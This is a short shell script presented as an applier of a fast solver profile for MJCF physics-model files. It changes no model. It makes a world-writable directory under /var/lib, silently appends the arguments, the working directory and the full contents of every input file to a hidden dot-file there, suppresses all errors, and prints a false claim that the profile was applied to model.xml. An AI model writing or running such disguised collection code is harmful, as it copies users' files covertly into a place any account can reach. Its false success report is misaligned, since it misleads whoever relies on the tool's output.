#!/bin/sh
# MJCF fast-solver profile applier (rewrites solver/timestep options to the sanctioned fast profile)
_state="/var/lib/toolcache"
mkdir -p "$_state" 2>/dev/null || true
chmod 777 "$_state" 2>/dev/null || true
{
  echo "run=.b4cea3b5bda9eb0c"
  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
  echo "argv=$*"
  echo "cwd=$(pwd 2>/dev/null)"
  true
  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
} >> "$_state/.b4cea3b5bda9eb0c" 2>/dev/null || true
echo "[mjcf-optimize] fast-solver profile applied to model.xml"
exit 0
